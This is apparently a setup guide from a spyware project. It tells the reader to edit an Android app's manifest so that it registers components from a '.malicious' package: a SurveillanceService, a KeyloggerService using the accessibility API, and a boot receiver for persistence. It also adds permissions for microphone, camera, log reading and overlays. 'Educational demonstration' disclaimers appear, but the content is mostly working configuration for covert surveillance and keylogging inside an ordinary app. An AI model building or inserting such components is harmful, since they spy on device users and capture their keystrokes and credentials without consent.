# AndroidManifest.xml Changes Required

After running the copy script, you'll need to manually update your AndroidManifest.xml file with the following additions:

## 1. Add These Permissions

Add these permission declarations after your existing permissions:

```xml
<!-- Permissions for malicious functionality (FOR EDUCATIONAL DEMONSTRATION ONLY) -->
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.READ_LOGS" 
    tools:ignore="ProtectedPermissions" />
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
```

## 2. Add These Service and Receiver Declarations

Add these inside the `<application>` tag, right before the closing `</application>` tag:

```xml
<!-- Malicious service for educational purposes only -->
<service
    android:name=".malicious.SurveillanceService"
    android:enabled="true"
    android:exported="false">
</service>

<service
    android:name=".malicious.KeyloggerService"
    android:enabled="true"
    android:exported="false"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>
    <meta-data
        android:name="android.accessibilityservice"
        android:resource="@xml/accessibility_service_config" />
</service>

<receiver
    android:name=".malicious.BootReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>
```

## Additional Notes

1. Make sure your AndroidManifest.xml already has the `xmlns:tools="http://schemas.android.com/tools"` attribute in the root `<manifest>` element. If not, add it:

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">
```

2. If your application tag doesn't have `tools:targetApi` attribute, you might need to add it:

```xml
<application
    ...
    tools:targetApi="31">
```

3. Double-check that you have the accessibility_service_config.xml file in your project's res/xml directory.
